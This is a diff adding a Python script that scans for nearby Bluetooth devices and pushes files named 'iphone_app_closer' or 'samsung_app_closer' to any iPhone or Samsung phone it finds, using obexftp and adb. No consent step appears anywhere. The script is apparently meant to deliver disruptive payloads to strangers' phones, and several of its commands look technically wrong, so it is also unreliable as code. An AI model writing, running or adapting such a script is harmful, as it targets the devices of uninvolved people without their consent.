@@ -1,0 +1,27 @@
+import bluetooth
+import os
+import subprocess
+
+def connect_to_bluetooth_devices():
+    nearby_devices = bluetooth.discover_devices()
+    
+    for addr in nearby_devices:
+        name = bluetooth.lookup_name(addr)
+        print("Device Name:", name)
+        print("Device Address:", addr)
+        
+        # Send file to iPhone
+        if "iPhone" in name:
+            file_path = "path/to/iphone_app_closer"
+            os.system(f"obexftp -b {addr} -p {file_path}")
+            os.system(f"obexftp -b {addr} -c {file_path}")
+
+        # Send file to Samsung
+        if "Samsung" in name:
+            file_path2 = "path/to/samsung_app_closer"
+            command = f'adb push {file_path2} /sdcard/'
+            subprocess.run(command, shell=True)
+            os.system(f"obexftp -b {addr} -p {file_path2}")
+            os.system(f"obexftp -b {addr} -c {file_path2}")
+
+connect_to_bluetooth_devices()
